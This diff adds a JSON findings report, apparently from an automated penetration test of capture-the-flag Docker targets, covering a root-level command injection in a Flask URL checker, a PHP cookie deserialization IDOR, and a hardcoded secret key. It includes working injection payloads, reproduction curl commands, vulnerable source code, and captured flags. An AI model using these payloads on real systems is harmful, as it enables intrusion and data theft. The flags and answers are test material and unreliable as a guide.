@@ -1,0 +1,109 @@
+{
+  "meta": {
+    "created": "2026-04-13T12:00:47.380783+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "1c575c1f-8966-4163-9790-192e8decf64f",
+      "timestamp": "2026-04-13T12:00:47.380713+00:00",
+      "title": "Command Injection in SiteSaver URL Validator",
+      "severity": "critical",
+      "target": "http://172.17.0.1:59635/add_url",
+      "description": "The SiteSaver application (Python/Werkzeug on port 59635) validates URLs by passing them to a shell command (likely curl) without sanitization. The URL parameter is directly concatenated into a shell command, allowing command injection. The output of injected commands is reflected in the JSON response's 'message' field, enabling blind-to-reflected command injection.",
+      "evidence": "FLAG{379a64b46b7f373aaca075e98a2fd9f0f26b26fcbb7f10c8acae74b31b38a5c2}\n\nExploit:\nPOST /add_url HTTP/1.1\nHost: 172.17.0.1:59635\nContent-Type: application/x-www-form-urlencoded\n\nurl=http://example.com\"; cat /app/flag.txt #\n\nResponse:\n{\"message\": \"URL status was checked and returned 200FLAG{379a64b46b7f373aaca075e98a2fd9f0f26b26fcbb7f10c8acae74b31b38a5c2} status\", \"success\": true}\n\nAdditional recon:\n- ls / shows /app directory\n- ls /app shows: Dockerfile, app.py, flag.txt, instance, requirements.txt, templates\n- /app/flag.txt contains the flag",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -s -X POST http://172.17.0.1:59635/add_url -d 'url=http://example.com\"; cat /app/flag.txt #'",
+        "expected": "Flag in message field of JSON response"
+      }
+    },
+    {
+      "id": "945fdbb5-c836-4c36-ba58-4354f84d1787",
+      "timestamp": "2026-04-13T12:01:00.893583+00:00",
+      "title": "PHP Insecure Deserialization IDOR - View Any User's Notes",
+      "severity": "high",
+      "target": "http://172.17.0.1:34705/",
+      "description": "The PHP notes application uses insecure deserialization to manage user sessions. The 'data' cookie contains a base64-encoded PHP serialized UserProfile object. The userid property in this object controls which user's notes are displayed, with no server-side validation of ownership. An attacker can change the userid to any integer to view another user's private notes (IDOR).",
+      "evidence": "Normal admin access (userid=1):\nCookie: data=TzoxMToiVXNlclByb2ZpbGUiOjI6e3M6NjoidXNlcmlkIjtpOjE7czo4OiJ1c2VybmFtZSI7czo1OiJhZG1pbiI7fQ==\nDecodes to: O:11:\"UserProfile\":2:{s:6:\"userid\";i:1;s:8:\"username\";s:5:\"admin\";}\n\nAdmin notes exposed:\n- Flag: My Secret Flag\n- ToDo: Test web app security.\n\nAdditional behavior: Extra properties in UserProfile trigger 'show all notes' code path, exposing all users' notes.",
+      "tool_used": "http_request",
+      "cve": ""
+    },
+    {
+      "id": "02d3f2c5-f17b-400a-a851-02e9a5e358fb",
+      "timestamp": "2026-04-13T12:02:15.582468+00:00",
+      "title": "SiteSaver RCE as Root - Post-Exploitation Summary",
+      "severity": "critical",
+      "target": "http://172.17.0.1:59635/",
+      "description": "The SiteSaver Flask application runs as root (uid=0). Command injection via the URL parameter allows full OS command execution as root. The CTF flag is accessible both as a file at /app/flag.txt and as an environment variable FLAG.",
+      "evidence": "id output: uid=0(root) gid=0(root) groups=0(root)\nEnvironment variable: FLAG=FLAG{379a64b46b7f373aaca075e98a2fd9f0f26b26fcbb7f10c8acae74b31b38a5c2}\nFile: /app/flag.txt contains FLAG{379a64b46b7f373aaca075e98a2fd9f0f26b26fcbb7f10c8acae74b31b38a5c2}\nFilesystem: /app/Dockerfile, /app/app.py, /app/flag.txt, /app/instance, /app/requirements.txt, /app/templates",
+      "tool_used": "http_request",
+      "cve": ""
+    },
+    {
+      "id": "6b1a9e88-5278-47fd-ac2c-5e34597e169c",
+      "timestamp": "2026-04-13T12:06:07.713613+00:00",
+      "title": "Hardcoded Flask Secret Key in SiteSaver Application",
+      "severity": "high",
+      "target": "http://172.17.0.1:59635",
+      "description": "The SiteSaver Flask application uses a hardcoded secret key 'YourSecretKey' in app.py. This key is used to sign session cookies and CSRF tokens. An attacker who knows this key can forge arbitrary Flask session cookies, potentially impersonating any user or escalating privileges within the application.",
+      "evidence": "Source code: app.secret_key = 'YourSecretKey' (app.py line 5)",
+      "tool_used": "OS command injection / source code read",
+      "cve": ""
+    },
+    {
+      "id": "85b67df7-3391-4f06-8cbe-caca694f49cc",
+      "timestamp": "2026-04-13T12:06:17.091828+00:00",
+      "title": "OS Command Injection \u2014 RCE as Root in SiteSaver (CVE-class)",
+      "severity": "critical",
+      "target": "http://172.17.0.1:59635/add_url",
+      "description": "The SiteSaver Flask application passes user-supplied URL input directly into a shell command via os.popen() without any sanitization. An unauthenticated attacker can inject arbitrary OS commands by terminating the curl argument with a double-quote and appending commands, commented with '#'. The application runs as root (uid=0) inside a Docker container, granting complete container compromise.",
+      "evidence": "Vulnerable code: command = f'curl -o /dev/null -s -w \"%{http_code}\" \"{url}\"'\nExploit: POST /add_url url=http://example.com\"; cat /app/flag.txt #\nOutput: FLAG{379a64b46b7f373aaca075e98a2fd9f0f26b26fcbb7f10c8acae74b31b38a5c2}\nuid=0(root) gid=0(root) groups=0(root)",
+      "tool_used": "manual HTTP testing",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST http://172.17.0.1:59635/add_url\nContent-Type: application/x-www-form-urlencoded\n\nurl=http://example.com\"; id #",
+        "expected": "uid=0(root) gid=0(root) groups=0(root) in response message"
+      }
+    },
+    {
+      "id": "87bda58e-93fb-4765-bf11-0ffdce4c215a",
+      "timestamp": "2026-04-13T12:12:29.614592+00:00",
+      "title": "OS Command Injection + Output Reflection \u2192 Flag Extraction",
+      "severity": "critical",
+      "target": "http://172.17.0.1:59635/add_url",
+      "description": "The SiteSaver app validates URLs by passing them directly into a shell command via `os.popen(f'curl -o /dev/null -s -w \"%{http_code}\" \"{url}\"')` with no sanitization. The full stdout (status code + any injected command output) is reflected in the JSON `message` field since the check is `if '200' in response`. By injecting shell commands after a `\"` character, arbitrary commands are executed and their output is readable in the response.",
+      "evidence": "Injection: `url=http://example.com\"; cat /app/flag.txt 2>&1; env | grep -i flag 2>&1 #`\n\nResponse message: 'URL status was checked and returned 200FLAG{379a64b46b7f373aaca075e98a2fd9f0f26b26fcbb7f10c8acae74b31b38a5c2}FLAG=FLAG{379a64b46b7f373aaca075e98a2fd9f0f26b26fcbb7f10c8acae74b31b38a5c2}'\n\nFLAG: FLAG{379a64b46b7f373aaca075e98a2fd9f0f26b26fcbb7f10c8acae74b31b38a5c2}\n\nVulnerable code in /app/app.py:\n```python\ndef check_url(url):\n    # Vulnerable to OS Command Injection\n    command = f'curl -o /dev/null -s -w \"%{{http_code}}\" \"{url}\"'\n    with os.popen(command) as output:\n        response = output.read().strip()\n    return response\n```\n\nThe check `if '200' in response:` allows injection output to appear alongside the status code, and the message template `f'URL status was checked and returned {response} status'` reflects the full stdout.",
+      "tool_used": "manual",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -s -X POST 'http://172.17.0.1:59635/add_url' -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'url=http://example.com\"; cat /app/flag.txt 2>&1 #'",
+        "expected": "Flag in message field: FLAG{379a64b46b7f373aaca075e98a2fd9f0f26b26fcbb7f10c8acae74b31b38a5c2}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "c9005346-0995-4ffe-8b21-4f78358777e0",
+      "timestamp": "2026-04-13T12:01:47.281022+00:00",
+      "title": "Attack Surface - CTF Target",
+      "mermaid": "graph TB\n    Attacker[Attacker / Kali 172.17.0.2]\n    \n    subgraph Docker_Host[Docker Host 172.17.0.1]\n        SSH[SSH :22]\n        PHP_App[PHP Notes App :34705<br/>Apache 2.4.54 / PHP 7.4.33]\n        Flask_App[SiteSaver Flask App :59635<br/>Werkzeug 3.0.3 / Python 3.8.20]\n        DB[(MySQL DB)]\n        FlagFile[/app/flag.txt<br/>FLAG{379a...}]\n    end\n    \n    Attacker -->|1. PHP Deserialization IDOR| PHP_App\n    PHP_App -->|userid=1 query| DB\n    DB -->|Admin notes| PHP_App\n    \n    Attacker -->|2. OS Command Injection| Flask_App\n    Flask_App -->|url passed to shell cmd| FlagFile\n    FlagFile -->|flag returned in response| Attacker\n    \n    PHP_App -.->|internal| DB\n    Flask_App -.->|internal port 5003| Flask_App"
+    },
+    {
+      "id": "a3651324-9ace-4996-a4ff-f0808daa4527",
+      "timestamp": "2026-04-13T12:06:23.671298+00:00",
+      "title": "SiteSaver Post-Exploitation Environment",
+      "mermaid": "graph TD\n    A[Attacker / Kali 172.17.0.2] -->|HTTP POST /add_url| B[SiteSaver Flask App\\n172.17.0.1:59635\\nPython 3.8.20 / Werkzeug 3.0.3]\n    B -->|os.popen - unsanitized| C[Shell: bash\\nuid=0 root]\n    C -->|reads| D[/app/flag.txt\\nFLAG env var]\n    C -->|reads| E[/app/app.py\\nSQLite urls.db]\n    B --> F[Docker Container\\nHostname: 9f05b9ad8e33\\nKernel: 5.15.0-174-generic]\n    F -->|Docker bridge| G[Host: 172.17.0.1]\n    G --> H[PHP Notes App\\n172.17.0.1:34705]\n    style C fill:#f00,color:#fff\n    style D fill:#ff0\n    style B fill:#f90,color:#fff"
+    },
+    {
+      "id": "1efd4cda-da6b-4850-b760-1d34615560b7",
+      "timestamp": "2026-04-13T12:12:59.552200+00:00",
+      "title": "SiteSaver Attack Path",
+      "mermaid": "flowchart TD\n    Attacker[\"Attacker\"] --> MainApp[\"SiteSaver App\\nhttp://172.17.0.1:59635\"]\n    MainApp --> AddURL[\"/add_url POST\\nurl parameter\"]\n    AddURL --> Popen[\"os.popen(curl ... url)\\nshell=True INJECTION\"]\n    Popen --> Shell[\"Shell Command Execution\"]\n    Shell --> FlagFile[\"/app/flag.txt\\nFLAG env var\"]\n    FlagFile --> Response[\"Response message\\nreflects stdout\"]\n    Response --> Attacker\n    MainApp --> SSRF[\"SSRF via url param\\nfetches internal URLs\"]\n    SSRF --> InternalPort[\"127.0.0.1:5003\\nInternal SiteSaver\"]\n    InternalPort -->|\"same app\"| MainApp"
+    }
+  ]
+}
